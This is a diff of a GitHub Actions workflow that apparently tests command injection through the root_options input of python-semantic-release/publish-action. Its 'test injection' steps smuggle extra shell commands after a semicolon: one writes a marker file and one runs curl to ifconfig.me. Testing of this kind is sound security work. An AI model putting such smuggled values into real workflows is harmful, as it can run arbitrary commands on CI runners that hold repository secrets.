@@ -18,13 +18,13 @@ jobs:
         uses: python-semantic-release/publish-action@v9.21.1
         with:
           github_token: ${{ secrets.GITHUB_TOKEN }}
-          root_options: "--noop; echo 'INJECTED COMMAND EXECUTED' > injected.txt"
+          root_options: "-h; echo 'INJECTED COMMAND EXECUTED' > injected.txt; echo "
 
       - name: test injection 2
         uses: python-semantic-release/publish-action@v9.21.1
         with:
           github_token: ${{ secrets.GITHUB_TOKEN }}
-          root_options: "--noop; curl https://ifconfig.me -o myip.txt"
+          root_options: "-h; curl https://ifconfig.me -o myip.txt; echo "
       
       - name: upload artifact
         uses: actions/upload-artifact@v4
